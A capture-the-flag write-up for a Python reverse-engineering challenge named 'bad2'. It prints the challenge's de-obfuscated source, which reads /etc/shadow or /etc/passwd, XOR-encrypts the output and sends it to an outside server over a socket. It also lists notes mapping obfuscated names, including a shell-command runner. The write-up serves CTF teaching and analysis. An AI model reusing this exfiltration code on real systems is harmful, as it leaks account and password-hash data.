# Bad2
Level - Hard

Description:
```
In a BYU-only CTF held at the end of one of our semesters, I made a Python rev chall called `bad`. Well, my power has doubled since the last time we met!! So now I'm making `bad2` 😈

[bad2.py]
```

## Writeup
Before obfuscating the HEcK out of this file, this is what the code looks like:

```python
#!/usr/bin/python3

# runs commands and retrieves output
import subprocess

output = "$ whoami\n"
output += subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0].decode("utf-8")
if output[:-4] == "root":
    output += "$ cat /etc/shadow\n"
    output += subprocess.Popen(['cat', '/etc/shadow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0].decode("utf-8")
else:
    output += "$ cat /etc/passwd\n"
    output += subprocess.Popen(['cat', '/etc/passwd'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0].decode("utf-8")

# check that "password" is present in tmpfile
if (open("/tmp/tmp2iu36124").read() != "c94mftoSzLH9nuoJeialx9dPRR8Qwbs2XHZ588m17yntCtl5SEk81Y5wK+YDmvMT"):
    exit()

# check that the file is in the proper place
if (__file__ != "/tmp/tmprx0b9h45") and (__file__ != "/home/justin/ctf/future-ctf-problems/bad2/bad2.py"):
    exit()

import hashlib
hash = hashlib.sha256(open(__file__,'rb').read()[:100]).hexdigest()

if (hash != "aaaaaaaa"):
    exit()

# OTP with flag to encrypt output
flag = "byuctf{th1s_1s_just_th3_beginn1ng_of_my_un1code_discov3r135}"
to_send=""
for letter in output:
    to_send+=chr(ord(letter) ^ ord(flag[len(output) % len(flag)]))

# sends the output to the server byuctf.xyz on port 42561
import base64
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("byuctf.xyz", 42561))
s.send(base64.b64encode(to_send.encode("utf-8")))
s.close()
```

It runs the commands `whoami` and `cat /etc/shadow` or `cat /etc/passwd`, runs 3 checks before sending out the data, then XORs the flag with the output, and base64 encodes it while sending it through a socket. If any of the checks are false, it will exit early. The three checks are:

* The file `/tmp/tmp2iu36124` exists with the contents `c94mftoSzLH9nuoJeialx9dPRR8Qwbs2XHZ588m17yntCtl5SEk81Y5wK+YDmvMT` (no newline at the end)
* The file being run is called `/tmp/tmprx0b9h45` or `/home/justin/ctf/future-ctf-problems/bad2/bad2.py`
* The SHA-256 hash of the first 3263 characters of the file being run is `27ce7196cf06ba8c9cf06a177bd394ee172cbad465584dcdeb66e2c9017da95d`.

The flag is the key used to XOR the output of the two commands being run. It can be found by taking the static array, adding 5 to each number, and XORing with the letters of `"whoami"`.

**Flag** - `byuctf{th1s_1s_just_th3_beginn1ng_of_my_un1code_discov3r135}`

## Notes
```python
'c︀' = base64.b64decode
'c︁' = arr
'c︂' = __file__
'c︃' = codecs.encode
'c︄' = {} of global vars
    c︄['‮'] = output
    c︄['с'] = len
    c︄['c'] = chr
    c︄['c︃'] = __builtins__.__doc__
    c︄['c︉'] = int
    c︄['c︌'] = to_send
'c︅' = exit
'c︆' = exec
'c︇'
'c︈' = base64.b32decode
'c︉' = ord
'c︊' = c︄['‮']
'c︋' = lambda x:x.decode()
'c︌' = cmd, or lambda ػ:c︋(os.Popen(ػ,stdout=os.PIPE,stderr=os.PIPE,shell=True).communicate()[0])
'c︍' = 'rot-13'
'c︎' = i

should output b'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'
```